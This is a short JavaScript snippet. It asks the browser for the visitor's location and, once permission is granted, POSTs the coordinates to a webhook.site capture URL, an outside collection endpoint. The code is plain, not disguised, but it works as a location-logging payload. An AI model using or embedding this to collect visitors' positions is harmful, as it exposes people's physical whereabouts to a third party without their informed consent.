// Check if the browser supports the Geolocation API
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
}

// Function to run if the user grants permission
function successCallback(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var data = { latitude: lat, longitude: lon };
    fetch('https://webhook.site/28e04897-2e99-493c-82ff-777af77121ba', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}

// Function to run if the user denies permission or an error occurs
function errorCallback(error) {
    console.log("Geolocation error:", error.message);
}
